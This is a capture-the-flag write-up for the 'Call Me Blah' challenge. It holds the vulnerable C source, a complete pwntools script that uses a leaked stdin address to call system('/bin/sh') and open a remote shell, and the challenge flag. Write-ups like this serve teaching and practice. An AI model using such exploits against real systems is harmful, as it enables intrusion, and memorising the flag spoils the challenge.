# Solution to Call Me Blah

This challenge shows you how to exploit a memory leak to spawn a shell on server side. You are given the binary file itself, the source code in C and two libraries that come with it.

When we launch the code, it prints some data, then you can input things but the program stops.

## Analysing the code

The first step is to analyse the code to understand what it does:

```C
main(void)
{
	void (*call_me)(char *);
	char blah[32];

	printf("%p\n", stdin);

	if (scanf("%zd%*c", (ssize_t *)&call_me) != 1) {
		fputs("This is not a number.\n", stderr);
		return EXIT_FAILURE;
	}

	if (fgets(blah, sizeof(blah), stdin) == NULL) {
		fputs("Read error.\n", stderr);
		return EXIT_FAILURE;
	}

    call_me(blah);

	return EXIT_SUCCESS;
}
```
Here's a breakdown of the code:
* The program starts by declaring the `call_me` variable, which is declared as a pointer of a function that takes a string as argument, and a `blah` variable as a string.
* Then, the program prints the memory address of the function `stdin`, this is a leak of memory !
* After that, the program asks you to enter a number that will be store inside the `call_me` variable, and a string that will be stored in the `blah` variable.
* Finally, the program calls the function that `call_me` points to, with the argument of `blah`.

But how can we call a function if we gave a number to `call_me` ? This was confusing to me at first, but what you're giving to `call_me` isn't the name of a function, but the value of the memory where that function is stored ! That's why you give it a number !

So what do we do from now ? The challenge is to open a shell on the server, which means that we want to execute `system("/bin/sh")` server side.

## Making the exploit

Now that we know that, we're going to use Python to do our exploit:

```Python
from pwn import *

# Defines the different binary given
callmeblah = context.binary = ELF("./call-me-blah")
libc = ELF("./libc-2.36.so")
ld = ELF("./ld-2.36.so")

# Connects to the serveur
HOST, PORT = "127.0.0.1", 4000
r = remote(HOST, PORT)

# Gets the leaked address of stdin given by the server
leaked_address = r.recv().decode()
leaked_address = int(leaked_address[2:], 16)
print(f"Leaked address: {leaked_address}")

# Gets the official stdin address in the library
stdin_address = libc.sym["_IO_2_1_stdin_"]
print(f"Official stdin address: {stdin_address}")

# Sets the base address with the offset we found
libc.address = (leaked_address - stdin_address)

# Gets the address of the system function
system_address = libc.sym["system"]
print(f"System address using libc.address: {system_address}")

# Sends the address of the system funtion and the /bin/sh argument and switch to interactive mode
r.sendline(str(system_address).encode())
r.sendline("/bin/sh".encode())
r.interactive()
```

The file should be quite self-explanatory with the information we know but let's detail it a little for those interested:
* We use the `ELF()` method from pwntools to define our binaries and libraries. The `context.binary` helps pwntools to understand the context of the script.
* We make the connection to the server (here it's just localhost)
* We receive the leaked address of the `stdin` function given by the server and we convert it to an integer (it's sent in hexadecimal by the server)
* We retreive the official address of the `stdin` function in our local libc library using `sym` (for *symbol*) using the parameter `"_IO_2_1_stdin_"`
* Now that we now the difference between our address and the server address, we can offset the library's address based on the offset we found using the leaked address. It's basically like offsetting the "0" of the library.
* We can then get the address of the `system` function now that we have the same addresses than the server (because we have the same offset than the server)
* Finally, we send the address of the `system` function, and the `"/bin/sh"` argument to open a shell on the server. We switch in interactive mode to write in our terminal.
* Write `ls` in the terminal, you'll see that the shell was opened successfully, you see a `flag.txt` file, you can print it's content using `cat` !

And here's the Flag: `FCSC{c22407092c870dfb9b6ee7e5277015de9c2a6fbc16a251237c037e73eb7a3a7e}`